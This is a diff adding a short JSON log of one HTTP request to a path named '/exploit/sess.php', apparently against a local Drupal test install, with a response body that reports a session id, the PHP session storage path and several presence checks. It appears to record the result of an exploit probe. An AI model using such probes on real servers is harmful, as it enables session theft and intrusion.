@@ -1,0 +1,8 @@
+{
+ "target": "/exploit/sess.php",
+ "status": 200,
+ "sent": 297,
+ "ms": 2,
+ "err": null,
+ "body_head": "sid=a93e669dcb85a01e75d60cfefdac94ee\nsl=/tmp/opencode/drupaldx/sites/default/files/php/sessions\nmem=2M\nfiles=1\nS=absent\nJ=absent\nK=absent\nx=absent\nok\n"
+}
